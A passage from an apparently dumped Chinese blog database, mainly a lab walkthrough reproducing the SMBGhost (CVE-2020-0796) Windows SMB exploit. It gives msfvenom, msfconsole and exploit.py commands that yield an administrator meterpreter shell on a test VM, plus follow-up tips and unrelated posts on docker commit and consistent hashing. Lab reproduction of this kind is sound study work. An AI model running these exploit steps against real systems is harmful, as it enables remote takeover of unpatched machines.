payload</span><br></pre></td></tr></table></figure>\n\n<p>执行之后会在SMBGhost_RCE_PoC目录下生成payload文件。接下来很重要的步骤：</p>\n<ol>\n<li><p>打开payload。</p>\n</li>\n<li><p>打开exploit.py。</p>\n</li>\n<li><p>将payload中“buf”字段全部替换为“USER_PAYLOAD”字段。</p>\n</li>\n<li><p>复制替换完成的payload文件内容。</p>\n</li>\n<li><p>粘贴到（覆盖）exploit.py文件USER_PAYLOAD区域。</p>\n</li>\n</ol>\n<p><img src=\"/2023/04/21/CVE-2020-0796/2.png\" alt=\"修改payload\"></p>\n<h3 id=\"开始攻击\"><a href=\"#开始攻击\" class=\"headerlink\" title=\"开始攻击\"></a>开始攻击</h3><ol>\n<li><p>启动<code>msfconsole</code>。</p>\n</li>\n<li><p>使用模块。</p>\n</li>\n<li><p>设置有效载荷和相关参数。</p>\n</li>\n</ol>\n<p>依次执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole -q</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 4444</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost 192.168.20.135</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/21/CVE-2020-0796/3.png\" alt=\"攻击\"></p>\n<p>再打开一个终端，进入SMBGhost_RCE_PoC目录，运行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 exploit.py -ip 192.168.20.135</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/21/CVE-2020-0796/4.png\" alt=\"运行 exploit.py\"></p>\n<p>出现这步后按下回车。</p>\n<p>然后回到win10，发现win10蓝屏正在重启。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/5.png\" alt=\"win10重启\"></p>\n<p>如果完成的彻底，<code>msfconsole</code>终端会弹出meterpreter，但是很遗憾，我没有拿到靶机的shell。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/6.png\" alt=\"拿到shell\"></p>\n<hr>\n<p>手动分割线</p>\n<hr>\n<h3 id=\"玄学排错\"><a href=\"#玄学排错\" class=\"headerlink\" title=\"玄学排错\"></a>玄学排错</h3><p>接着上次的来说，上次是没有拿到shell的。经过一些网上拍错和别的同学的交流，得到了一些启发，最终成功拿到了shell。其中有很多问题也是很玄学的。</p>\n<ol>\n<li><p>把靶机的内存设置大一点，我直接给到了8G。</p>\n</li>\n<li><p>kali和靶机的连通最好不要使用NAT连接，如果使用NAT连接，建议把宿主机的防火墙和病毒保护也关闭。</p>\n</li>\n<li><p>在靶机中要在控制面板-程序-启用或关闭windows的功能-打开SMB开关，然后重启。</p>\n</li>\n<li><p>在进行paylod-code生成的时候，尽量不要使用原有的4444端口（我用的9876）。</p>\n</li>\n<li><p>更换了windows的镜像，重新安装了一个虚拟机，镜像保存在了<a href=\"https://pan.baidu.com/s/1M1GvWoMcJc5nZA_tS4tang\">百度云盘</a>里，提取码：0731。</p>\n</li>\n</ol>\n<h3 id=\"成功的尝试\"><a href=\"#成功的尝试\" class=\"headerlink\" title=\"成功的尝试\"></a>成功的尝试</h3><p>生成payload-code。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/9.png\"></p>\n<p>然后替换exploit.py文件中user_payload字段。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/10.png\"></p>\n<p>前面的操作还是一样，进入工具，使用模块，设置payload。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/7.png\"></p>\n<p>设置攻击参数。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/8.png\"></p>\n<p>执行run命令并在此等候。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/11.png\"></p>\n<p>然后再开一个终端</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/12.png\"></p>\n<p>成功拿到shell，是管理员的权限没有错。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/13.png\"></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"惭愧声明\"><a href=\"#惭愧声明\" class=\"headerlink\" title=\"惭愧声明\"></a>惭愧声明</h3><p>稍微了解一点就会知道，CVE-2020-0796是可以拿到shell的，但是因为技术能力的限制，到现在复现bug我也没有拿到shell，只会让靶机蓝屏重启。先把博客更了，等后续搞明白了，再来更新。</p>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>首先，准备一台kali和一台运行1903版本或者1909版本的windows10。</p>","more":"<p>关闭windows10的防火墙和实时保护功能。</p>\n<p>在kali上准备待会要用到的工具。</p>\n<ol>\n<li>启用扫描脚本</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  git clone https://github.com/ollypwn/SMBGhost.git</span><br></pre></td></tr></table></figure>\n\n<p>有人说这个脚本不准确，有时候检测超时也会报bug可利用，这个脚本也不太重要，至少对于这个实验来说。</p>\n<ol start=\"2\">\n<li>下载EXP脚本</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"扫描bug\"><a href=\"#扫描bug\" class=\"headerlink\" title=\"扫描bug\"></a>扫描bug</h3><p>准备好扫描脚本后进入该目录，执行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  python3 scanner.py <span class=\"number\">192.168</span><span class=\"number\">.20</span><span class=\"number\">.135</span></span><br></pre></td></tr></table></figure>\n\n<p>“192.168.20.135”更换为自己靶机的IP。下面是效果图，显示”Vulnerable”，易受攻击的。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/1.png\" alt=\"bug扫描\"></p>\n<h3 id=\"准备payload\"><a href=\"#准备payload\" class=\"headerlink\" title=\"准备payload\"></a>准备payload</h3><p>进入使用EXP脚本的SMBGhost_RCE_PoC目录，执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o payload</span><br></pre></td></tr></table></figure>\n\n<p>执行之后会在SMBGhost_RCE_PoC目录下生成payload文件。接下来很重要的步骤：</p>\n<ol>\n<li><p>打开payload。</p>\n</li>\n<li><p>打开exploit.py。</p>\n</li>\n<li><p>将payload中“buf”字段全部替换为“USER_PAYLOAD”字段。</p>\n</li>\n<li><p>复制替换完成的payload文件内容。</p>\n</li>\n<li><p>粘贴到（覆盖）exploit.py文件USER_PAYLOAD区域。</p>\n</li>\n</ol>\n<p><img src=\"/2023/04/21/CVE-2020-0796/2.png\" alt=\"修改payload\"></p>\n<h3 id=\"开始攻击\"><a href=\"#开始攻击\" class=\"headerlink\" title=\"开始攻击\"></a>开始攻击</h3><ol>\n<li><p>启动<code>msfconsole</code>。</p>\n</li>\n<li><p>使用模块。</p>\n</li>\n<li><p>设置有效载荷和相关参数。</p>\n</li>\n</ol>\n<p>依次执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole -q</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 4444</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost 192.168.20.135</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/21/CVE-2020-0796/3.png\" alt=\"攻击\"></p>\n<p>再打开一个终端，进入SMBGhost_RCE_PoC目录，运行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 exploit.py -ip 192.168.20.135</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/21/CVE-2020-0796/4.png\" alt=\"运行 exploit.py\"></p>\n<p>出现这步后按下回车。</p>\n<p>然后回到win10，发现win10蓝屏正在重启。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/5.png\" alt=\"win10重启\"></p>\n<p>如果完成的彻底，<code>msfconsole</code>终端会弹出meterpreter，但是很遗憾，我没有拿到靶机的shell。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/6.png\" alt=\"拿到shell\"></p>\n<hr>\n<p>手动分割线</p>\n<hr>\n<h3 id=\"玄学排错\"><a href=\"#玄学排错\" class=\"headerlink\" title=\"玄学排错\"></a>玄学排错</h3><p>接着上次的来说，上次是没有拿到shell的。经过一些网上拍错和别的同学的交流，得到了一些启发，最终成功拿到了shell。其中有很多问题也是很玄学的。</p>\n<ol>\n<li><p>把靶机的内存设置大一点，我直接给到了8G。</p>\n</li>\n<li><p>kali和靶机的连通最好不要使用NAT连接，如果使用NAT连接，建议把宿主机的防火墙和病毒保护也关闭。</p>\n</li>\n<li><p>在靶机中要在控制面板-程序-启用或关闭windows的功能-打开SMB开关，然后重启。</p>\n</li>\n<li><p>在进行paylod-code生成的时候，尽量不要使用原有的4444端口（我用的9876）。</p>\n</li>\n<li><p>更换了windows的镜像，重新安装了一个虚拟机，镜像保存在了<a href=\"https://pan.baidu.com/s/1M1GvWoMcJc5nZA_tS4tang\">百度云盘</a>里，提取码：0731。</p>\n</li>\n</ol>\n<h3 id=\"成功的尝试\"><a href=\"#成功的尝试\" class=\"headerlink\" title=\"成功的尝试\"></a>成功的尝试</h3><p>生成payload-code。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/9.png\"></p>\n<p>然后替换exploit.py文件中user_payload字段。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/10.png\"></p>\n<p>前面的操作还是一样，进入工具，使用模块，设置payload。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/7.png\"></p>\n<p>设置攻击参数。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/8.png\"></p>\n<p>执行run命令并在此等候。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/11.png\"></p>\n<p>然后再开一个终端</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/12.png\"></p>\n<p>成功拿到shell，是管理员的权限没有错。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/13.png\"></p>"},{"title":"CVE漏洞成功复现的玄学条件","date":"2023-05-07T03:30:06.000Z","_content":"\n### 正文\n\n总结一下漏洞复现得出来的几点体会，之前在永恒之黑文章里就已经提过几次了。\n\n但还是有两点得补充一下\n\n<!-- more -->\n\n1. 在被kali攻击过一次之后，倘若没有拿到meterpreter，这个时候一般第二次也不会成功的，即便你所有的操纵都是对的。这个时候一定要重启靶机的系统。\n\n2. 设置攻击参数的时候，一定要看好参数，尤其是系统存在两个网卡的，一定要看攻击机的IP是不是和靶机的IP在同一个网段的。","source":"_posts/CVE-extend.md","raw":"---\ntitle: CVE漏洞成功复现的玄学条件\ntags:\n  - 网络安全\ndate: 2023-05-07 11:30:06\ncategories: 技术\n---\n\n### 正文\n\n总结一下漏洞复现得出来的几点体会，之前在永恒之黑文章里就已经提过几次了。\n\n但还是有两点得补充一下\n\n<!-- more -->\n\n1. 在被kali攻击过一次之后，倘若没有拿到meterpreter，这个时候一般第二次也不会成功的，即便你所有的操纵都是对的。这个时候一定要重启靶机的系统。\n\n2. 设置攻击参数的时候，一定要看好参数，尤其是系统存在两个网卡的，一定要看攻击机的IP是不是和靶机的IP在同一个网段的。","slug":"CVE-extend","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5d0000e7zj304am7bv8","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>总结一下漏洞复现得出来的几点体会，之前在永恒之黑文章里就已经提过几次了。</p>\n<p>但还是有两点得补充一下</p>\n<span id=\"more\"></span>\n\n<ol>\n<li><p>在被kali攻击过一次之后，倘若没有拿到meterpreter，这个时候一般第二次也不会成功的，即便你所有的操纵都是对的。这个时候一定要重启靶机的系统。</p>\n</li>\n<li><p>设置攻击参数的时候，一定要看好参数，尤其是系统存在两个网卡的，一定要看攻击机的IP是不是和靶机的IP在同一个网段的。</p>\n</li>\n</ol>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>总结一下漏洞复现得出来的几点体会，之前在永恒之黑文章里就已经提过几次了。</p>\n<p>但还是有两点得补充一下</p>","more":"<ol>\n<li><p>在被kali攻击过一次之后，倘若没有拿到meterpreter，这个时候一般第二次也不会成功的，即便你所有的操纵都是对的。这个时候一定要重启靶机的系统。</p>\n</li>\n<li><p>设置攻击参数的时候，一定要看好参数，尤其是系统存在两个网卡的，一定要看攻击机的IP是不是和靶机的IP在同一个网段的。</p>\n</li>\n</ol>"},{"title":"将更改过的容器导出为镜像","date":"2023-08-09T13:20:05.000Z","_content":"\n执行命令：\n\n```bash\ndocker commit -m \"add vim package\" -a \"liuxp\" 容器ID 容器名:版本号\n```\n\n* -m 添加提交描述。\n\n* -a 指明提交人。 ","source":"_posts/ContainerCommit.md","raw":"---\ntitle: 将更改过的容器导出为镜像\ndate: 2023-08-09 21:20:05\ncategories: 学习过程\ntags:\n  - Docker\n---\n\n执行命令：\n\n```bash\ndocker commit -m \"add vim package\" -a \"liuxp\" 容器ID 容器名:版本号\n```\n\n* -m 添加提交描述。\n\n* -a 指明提交人。 ","slug":"ContainerCommit","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5d4000i7zj3dbnqehca","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>执行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker commit -m <span class=\"string\">&quot;add vim package&quot;</span> -a <span class=\"string\">&quot;liuxp&quot;</span> 容器ID 容器名:版本号</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>-m 添加提交描述。</p>\n</li>\n<li><p>-a 指明提交人。</p>\n</li>\n</ul>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"","more":"<p>执行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker commit -m <span class=\"string\">&quot;add vim package&quot;</span> -a <span class=\"string\">&quot;liuxp&quot;</span> 容器ID 容器名:版本号</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>-m 添加提交描述。</p>\n</li>\n<li><p>-a 指明提交人。</p>\n</li>\n</ul>\n"},{"title":"分布式存储之一致性哈希算法","date":"2023-08-13T07:03:35.000Z","_content":"\n### 基本思想\n\n一致性哈希算法(Consistency Hashing)是一种分布式存储算法,通过哈希环实现数据的均衡分布和高可用。主要特点是:\n\n1. 数据映射到一个0到2^32的哈希环上。\n\n2. 节点也映射到这个哈希环上。\n\n<!-- more -->\n\n3. 每个数据通过哈希函数确定一个位置,定位到其顺时针方向第一台服务器节点上。\n\n4. 当新增或删除节点时,只影响相邻数据,大部分数据位置不变。\n\n比如节点A映射到哈希环的30位置,节点B映射到70位置。数据X映射到40位置,按顺时针方向找到节点A,所以存储到A上。\n\n如果新增节点C映射到50位置,只会影响40-50区间数据,其它数据位置不变,实现了高可用。\n\n相比哈希取余,一致性哈希算法只需要重定位部分数据,大大减少了扩容缩容的影响。\n\n它的缺点是数据分布不够均匀,容易造成数据倾斜。常见优化是引入虚拟节点来纾解热点问题。\n\n拓展资料：[简单介绍：一致性HASH算法和取余算法](https://blog.51cto.com/u_12740336/6173086)","source":"_posts/ConsistencyHashing.md","raw":"---\ntitle: 分布式存储之一致性哈希算法\ndate: 2023-08-13 15:03:35\ncategories: 理论知识\ntags:\n  - Docker\n  - Redis\n---\n\n### 基本思想\n\n一致性哈希算法(Consistency Hashing)是一种分布式存储算法,通过哈希环实现数据的均衡分布和高可用。主要特点是:\n\n1. 数据映射到一个0到2^32的哈希环上。\n\n2. 节点也映射到这个哈希环上。\n\n<!-- more -->\n\n3. 每个数据通过哈希函数确定一个位置,定位到其顺时针方向第一台服务器节点上。\n\n4. 当新增或删除节点时,只影响相邻数据,大部分数据位置不变。\n\n比如节点A映射到哈希环的30位置,节点B映射到70位置。数据X映射到40位置,按顺时针方向找到节点A,所以存储到A上。\n\n如果新增节点C映射到50位置,只会影响40-50区间数据,其它数据位置不变,实现了高可用。\n\n相比哈希取余,一致性哈希算法只需要重定位部分数据,大大减少了扩容缩容的影响。\n\n它的缺点是数据分布不够均匀,容易造成数据倾斜。常见优化是引入虚拟节点来纾解热点问题。\n\n拓展资料：[简单介绍：一致性HASH算法和取余算法](https://blog.51cto.com/u_12740336/6173086)","slug":"ConsistencyHashing","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5d6000k7zj30vg7749j","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"基本思想\"><a href=\"#基本思想\" class=\"headerlink\" title=\"基本思想\"></a>基本思想</h3><p>一致性哈希算法(Consistency Hashing)是一种分布式存储算法,通过哈希环实现数据的均衡分布和高可用。主要特点是:</p>\n<ol>\n<li><p>数据映射到一个0到2^32的哈希环上。</p>\n</li>\n<li><p>节点也映射到这个哈希环上。</p>\n</li>\n</ol>\n<span id=\"more\"></span>\n\n<ol 